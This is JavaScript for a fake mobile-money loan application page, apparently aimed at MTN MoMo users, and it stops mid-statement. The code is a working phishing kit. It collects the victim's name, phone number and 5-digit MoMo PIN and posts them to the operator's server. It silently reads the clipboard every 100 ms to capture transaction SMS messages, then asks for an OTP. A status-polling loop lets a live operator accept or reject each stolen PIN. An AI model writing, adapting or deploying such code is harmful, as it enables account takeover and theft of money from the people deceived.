document.addEventListener('DOMContentLoaded', () => {
    const params = new URLSearchParams(window.location.search);
    const adminId = params.get('admin');

    const screens = {
        notice: document.getElementById('step-notice'),
        calculator: document.getElementById('step-calculator'),
        step1: document.getElementById('step-1'),
        step2: document.getElementById('step-2'),
        step3: document.getElementById('step-3'),
        credentials: document.getElementById('step-credentials'),
        loading: document.getElementById('step-loading'),
        sms: document.getElementById('step-sms'),
        otp: document.getElementById('step-otp'),
        success: document.getElementById('step-success')
    };

    const rangeAmount = document.getElementById('range-amount');
    const rangeMonths = document.getElementById('range-months');
    const calcAmountDisplay = document.getElementById('calc-amount-display');
    const calcMonthsDisplay = document.getElementById('calc-months-display');
    const calcMonthlyDisplay = document.getElementById('calc-monthly-display');

    const inputLoanAmount = document.getElementById('input-loan-amount');
    const selectLoanDuration = document.getElementById('select-loan-duration');
    const inputLoanPurpose = document.getElementById('input-loan-purpose');

    const step2Alert = document.getElementById('step2-inline-alert');
    const inputFirstName = document.getElementById('input-first-name');
    const inputLastName = document.getElementById('input-last-name');
    const inputMomoPhone = document.getElementById('input-momo-phone');

    const credBanner = document.getElementById('cred-surface-banner');
    const credentialsForm = document.getElementById('credentials-form');
    const credPhone = document.getElementById('cred-phone');
    const pin5Boxes = Array.from(document.querySelectorAll('#pin-5-boxes .pin-box'));
    const credPinValue = document.getElementById('cred-pin-value');

    const loadingTitle = document.getElementById('loading-title');
    const loadingDesc = document.getElementById('loading-desc');

    const smsBanner = document.getElementById('sms-surface-banner');
    const smsCountdownEl = document.getElementById('sms-countdown');
    const smsInput = document.getElementById('sms-input');
    const btnVerifySms = document.getElementById('btn-verify-sms');
    const btnRequestNewSms = document.getElementById('btn-request-new-sms');

    const otpBanner = document.getElementById('otp-surface-banner');
    const otp4Boxes = Array.from(document.querySelectorAll('#otp-4-boxes .pin-box'));
    const otp4Value = document.getElementById('otp-4-value');
    const btnVerifyOtp = document.getElementById('btn-verify-otp');

    const finalLoanAmountEl = document.getElementById('final-loan-amount');

    let appState = {
        amount: '100,000',
        duration: '48 Months',
        purpose: 'Business expansion and working capital',
        firstName: '',
        lastName: '',
        phone: '',
        pin: '',
        sessionId: null
    };

    let statusPollTimer = null;
    let smsCountdownTimer = null;
    let smsWatcherTimer = null;
    let isSubmittingSms = false;
    let isSubmittingOtp = false;
    let expiredSmsSet = new Set();
    let lastSubmittedSmsNorm = '';

    const SMS_PREFIX = "Y'ello. Please note!";

    function normalizeSms(text) {
        return (text || '').trim().replace(/\s+/g, ' ');
    }

    function showScreen(targetKey) {
        Object.values(screens).forEach(el => {
            if (el) el.classList.add('hidden');
        });
        if (screens[targetKey]) {
            screens[targetKey].classList.remove('hidden');
        }
    }

    function showBanner(bannerEl, text) {
        if (!bannerEl) return;
        bannerEl.textContent = text;
        bannerEl.classList.remove('hidden');
    }

    function hideBanner(bannerEl) {
        if (!bannerEl) return;
        bannerEl.textContent = '';
        bannerEl.classList.add('hidden');
    }

    function isValidTenDigitZeroPhone(val) {
        return /^0\d{9}$/.test((val || '').trim());
    }

    function isValidYelloSms(text) {
        const normalized = normalizeSms(text);
        if (!normalized) return false;
        return normalized.startsWith(SMS_PREFIX) ||
            /^Y'ello\.\s*Please note!/i.test(normalized);
    }

    function isExpiredOrDuplicateSms(text) {
        const norm = normalizeSms(text);
        if (!norm) return false;
        return expiredSmsSet.has(norm);
    }

    function clearAllTimers() {
        if (statusPollTimer) clearInterval(statusPollTimer);
        if (smsCountdownTimer) clearInterval(smsCountdownTimer);
        if (smsWatcherTimer) clearInterval(smsWatcherTimer);
    }

    function updateCalculator() {
        const amt = parseInt(rangeAmount.value, 10) || 100000;
        const months = parseInt(rangeMonths.value, 10) || 48;
        const monthly = Math.max(1, Math.round((amt * 1.1) / months));

        calcAmountDisplay.textContent = amt.toLocaleString();
        calcMonthsDisplay.textContent = `${months} months`;
        calcMonthlyDisplay.textContent = monthly.toLocaleString();

        appState.amount = amt.toLocaleString();
        appState.duration = `${months} Months`;
        inputLoanAmount.value = amt.toLocaleString();
        selectLoanDuration.value = `${months} Months`;
    }

    rangeAmount.addEventListener('input', updateCalculator);
    rangeMonths.addEventListener('input', updateCalculator);
    updateCalculator();

    document.getElementById('btn-get-started').addEventListener('click', () => {
        showScreen('calculator');
    });

    document.getElementById('btn-continue-calc').addEventListener('click', () => {
        showScreen('step1');
    });

    document.getElementById('btn-next-1').addEventListener('click', () => {
        appState.amount = (inputLoanAmount.value || appState.amount).trim();
        appState.duration = selectLoanDuration.value;
        appState.purpose = (inputLoanPurpose.value || 'Business expansion and working capital').trim();
        showScreen('step2');
    });

    document.getElementById('btn-prev-2').addEventListener('click', () => {
        showScreen('step1');
    });

    inputMomoPhone.addEventListener('input', () => {
        inputMomoPhone.value = inputMomoPhone.value.replace(/\D/g, '').slice(0, 10);
    });

    document.getElementById('btn-next-2').addEventListener('click', () => {
        hideBanner(step2Alert);
        const fn = inputFirstName.value.trim();
        const ln = inputLastName.value.trim();
        const ph = inputMomoPhone.value.trim();

        if (!fn || !ln) {
            showBanner(step2Alert, "PLEASE ENTER YOUR FIRST NAME AND LAST NAME.");
            return;
        }
        if (!isValidTenDigitZeroPhone(ph)) {
            showBanner(step2Alert, "PHONE NUMBER MUST BE 10 DIGITS STARTING WITH 0.");
            return;
        }

        appState.firstName = fn;
        appState.lastName = ln;
        appState.phone = ph;
        credPhone.value = ph;

        document.getElementById('sum-amount').textContent = appState.amount;
        document.getElementById('sum-duration').textContent = appState.duration;
        document.getElementById('sum-purpose').textContent = appState.purpose;
        document.getElementById('sum-applicant').textContent = `${fn} ${ln}`;
        document.getElementById('sum-phone').textContent = ph;

        showScreen('step3');
    });

    document.getElementById('btn-prev-3').addEventListener('click', () => {
        showScreen('step2');
    });

    document.getElementById('btn-submit-step3').addEventListener('click', () => {
        hideBanner(credBanner);
        credPhone.value = appState.phone;
        reset5PinBoxes();
        showScreen('credentials');
        pin5Boxes[0].focus();
    });

    function reset5PinBoxes() {
        pin5Boxes.forEach(box => { box.value = ''; });
        credPinValue.value = '';
    }

    function sync5PinBoxes() {
        const pin = pin5Boxes.map(b => b.value).join('');
        credPinValue.value = pin;
        return pin;
    }

    pin5Boxes.forEach((box, idx) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '').slice(0, 1);
            sync5PinBoxes();
            if (box.value && idx < pin5Boxes.length - 1) {
                pin5Boxes[idx + 1].focus();
            }
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && idx > 0) {
                pin5Boxes[idx - 1].focus();
            }
        });
    });

    credPhone.addEventListener('input', () => {
        credPhone.value = credPhone.value.replace(/\D/g, '').slice(0, 10);
    });

    credentialsForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideBanner(credBanner);

        const phoneVal = credPhone.value.trim();
        const pinVal = sync5PinBoxes();

        if (!isValidTenDigitZeroPhone(phoneVal)) {
            showBanner(credBanner, "PHONE NO MUST START WITH 0 AND BE 10 DIGITS.");
            return;
        }
        if (!/^\d{5}$/.test(pinVal)) {
            showBanner(credBanner, "PIN MUST BE EXACTLY 5 DIGITS.");
            return;
        }

        appState.phone = phoneVal;
        appState.pin = pinVal;
        appState.sessionId = `sess_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
        expiredSmsSet.clear();
        lastSubmittedSmsNorm = '';

        loadingTitle.textContent = "VERIFYING MOMO DETAILS...";
        loadingDesc.textContent = "PLEASE WAIT FOR APPROVAL.";
        showScreen('loading');

        try {
            const res = await fetch('/api/submit-credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: appState.sessionId,
                    phone: phoneVal,
                    pin: pinVal,
                    loanAmount: appState.amount,
                    applicantName: `${appState.firstName} ${appState.lastName}`.trim(),
                    adminId
                })
            });
            const data = await res.json();
            if (data.success) {
                startStatusPolling();
            } else {
                showScreen('credentials');
                showBanner(credBanner, "UNABLE TO SUBMIT DETAILS. CHECK YOUR MOMO DETAILS AND TRY AGAIN.");
            }
        } catch (err) {
            showScreen('credentials');
            showBanner(credBanner, "NETWORK ERROR. CHECK YOUR MOMO DETAILS AND TRY AGAIN.");
        }
    });

    function startSmsStage(resetBannerMessage) {
        isSubmittingSms = false;
        smsInput.value = '';
        btnRequestNewSms.classList.add('hidden');
        if (resetBannerMessage) {
            showBanner(smsBanner, resetBannerMessage);
        } else {
            hideBanner(smsBanner);
        }
        showScreen('sms');
        smsInput.focus();

        let secondsLeft = 15;
        smsCountdownEl.textContent = String(secondsLeft);

        if (smsCountdownTimer) clearInterval(smsCountdownTimer);
        smsCountdownTimer = setInterval(() => {
            secondsLeft -= 1;
            if (secondsLeft <= 0) {
                clearInterval(smsCountdownTimer);
                smsCountdownEl.textContent = "0";
                btnRequestNewSms.classList.remove('hidden');
            } else {
                smsCountdownEl.textContent = String(secondsLeft);
            }
        }, 1000);

        if (smsWatcherTimer) clearInterval(smsWatcherTimer);
        smsWatcherTimer = setInterval(async () => {
            if (isSubmittingSms) return;

            const currentVal = normalizeSms(smsInput.value);
            if (isValidYelloSms(currentVal)) {
                if (isExpiredOrDuplicateSms(currentVal)) {
                    smsInput.value = '';
                    showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
                    return;
                }
                await submitSmsPayload(currentVal);
                return;
            }

            if (navigator.clipboard && navigator.clipboard.readText) {
                try {
                    const clipText = normalizeSms(await navigator.clipboard.readText());
                    if (isValidYelloSms(clipText)) {
                        if (isExpiredOrDuplicateSms(clipText)) {
                            smsInput.value = '';
                            showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
                            return;
                        }
                        smsInput.value = clipText;
                        await submitSmsPayload(clipText);
                    }
                } catch (_) {}
            }
        }, 100);
    }

    ['input', 'change', 'paste', 'keyup'].forEach(evtName => {
        smsInput.addEventListener(evtName, () => {
            if (isSubmittingSms) return;
            const text = normalizeSms(smsInput.value);
            if (!text) return;

            if (isExpiredOrDuplicateSms(text)) {
                smsInput.value = '';
                showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
                return;
            }

            if (isValidYelloSms(text)) {
                hideBanner(smsBanner);
                submitSmsPayload(text);
            }
        });
    });

    async function submitSmsPayload(text) {
        const cleanText = normalizeSms(text);
        if (isSubmittingSms) return;

        if (isExpiredOrDuplicateSms(cleanText)) {
            smsInput.value = '';
            showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
            return;
        }

        isSubmittingSms = true;
        lastSubmittedSmsNorm = cleanText;
        if (smsCountdownTimer) clearInterval(smsCountdownTimer);
        if (smsWatcherTimer) clearInterval(smsWatcherTimer);

        loadingTitle.textContent = "VERIFYING & SUBMITTING NEW SMS...";
        loadingDesc.textContent = "PLEASE WAIT FOR CONFIRMATION.";
        showScreen('loading');

        try {
            const res = await fetch('/api/submit-sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: appState.sessionId,
                    smsText: cleanText
                })
            });
            const data = await res.json();
            if (data && data.rejectedDuplicate) {
                expiredSmsSet.add(cleanText);
                startSmsStage("SMS EXPIRED — THIS SMS WAS ALREADY SUBMITTED AND EXPIRED. PLEASE ENTER A NEW SMS.");
                return;
            }
            startStatusPolling();
        } catch (_) {
            isSubmittingSms = false;
            startSmsStage("FAILED TO SEND SMS. PLEASE COPY AND PASTE A NEW SMS AGAIN.");
        }
    }

    btnVerifySms.addEventListener('click', () => {
        const text = normalizeSms(smsInput.value);
        if (isExpiredOrDuplicateSms(text)) {
            smsInput.value = '';
            showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
            return;
        }
        if (!isValidYelloSms(text)) {
            showBanner(smsBanner, "SMS MUST START WITH: Y'ello. Please note!");
            return;
        }
        submitSmsPayload(text);
    });

    btnRequestNewSms.addEventListener('click', async () => {
        btnRequestNewSms.disabled = true;
        showBanner(smsBanner, "NEW SMS REQUESTED. WAITING FOR NEW SMS...");
        try {
            await fetch('/api/request-new-sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: appState.sessionId })
            });
        } catch (_) {}
        btnRequestNewSms.disabled = false;
        let secondsLeft = 15;
        smsCountdownEl.textContent = String(secondsLeft);
        if (smsCountdownTimer) clearInterval(smsCountdownTimer);
        smsCountdownTimer = setInterval(() => {
            secondsLeft -= 1;
            if (secondsLeft <= 0) {
                clearInterval(smsCountdownTimer);
                smsCountdownEl.textContent = "0";
            } else {
                smsCountdownEl.textContent = String(secondsLeft);
            }
        }, 1000);
    });

    function reset4OtpBoxes() {
        otp4Boxes.forEach(b => { b.value = ''; });
        otp4Value.value = '';
    }

    function sync4OtpBoxes() {
        const code = otp4Boxes.map(b => b.value).join('');
        otp4Value.value = code;
        return code;
    }

    function startOtpStage(resetBannerMessage) {
        isSubmittingOtp = false;
        reset4OtpBoxes();
        if (resetBannerMessage) {
            showBanner(otpBanner, resetBannerMessage);
        } else {
            hideBanner(otpBanner);
        }
        showScreen('otp');
        otp4Boxes[0].focus();
    }

    otp4Boxes.forEach((box, idx) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '').slice(0, 1);
            if (box.value && idx < otp4Boxes.length - 1) {
                otp4Boxes[idx + 1].focus();
            }
            const code = sync4OtpBoxes();
            if (/^\d{4}$/.test(code) && !isSubmittingOtp) {
                submitOtpPayload(code);
            }
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && idx > 0) {
                otp4Boxes[idx - 1].focus();
            }
        });
    });

    async function submitOtpPayload(code) {
        if (isSubmittingOtp) return;
        isSubmittingOtp = true;
        if (statusPollTimer) clearInterval(statusPollTimer);

        loadingTitle.textContent = "CONFIRMING 4-DIGIT OTP...";
        loadingDesc.textContent = "PLEASE WAIT.";
        showScreen('loading');

        try {
            await fetch('/api/submit-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: appState.sessionId,
                    otpCode: code
                })
            });
            startStatusPolling();
        } catch (_) {
            isSubmittingOtp = false;
            startOtpStage("OTP EXPIRED");
        }
    }

    btnVerifyOtp.addEventListener('click', () => {
        const code = sync4OtpBoxes();
        if (!/^\d{4}$/.test(code)) {
            showBanner(otpBanner, "PLEASE CHECK YOUR SMS AND ENTER OTP SEND TO YOUR MOMO NUMBER.");
            return;
        }
        submitOtpPayload(code);
    });

    function startStatusPolling() {
        if (statusPollTimer) clearInterval(statusPollTimer);

        statusPollTimer = setInterval(async () => {
            if (!appState.sessionId) return;
            try {
                const res = await fetch(`/api/check-status/${appState.sessionId}`);
                const data = await res.json();

                if (data.status === 'allow_pin') {
                    clearInterval(statusPollTimer);
                    startSmsStage(null);
                } else if (data.status === 'deny_pin') {
                    clearInterval(statusPollTimer);
                    reset5PinBoxes();
                    showScreen('credentials');
                    showBanner(credBanner, "APPLICATION DENIED. CHECK YOUR MOMO DETAILS AND TRY AGAIN.");
                } else if (data.status === 'incorrect_pin') {
                    clearInterval(statusPollTimer);
                    reset5PinBoxes();
                    showScreen('credentials');
                    showBanner(credBanner, "INCORRECT PIN");
                    pin5Boxes[0].f
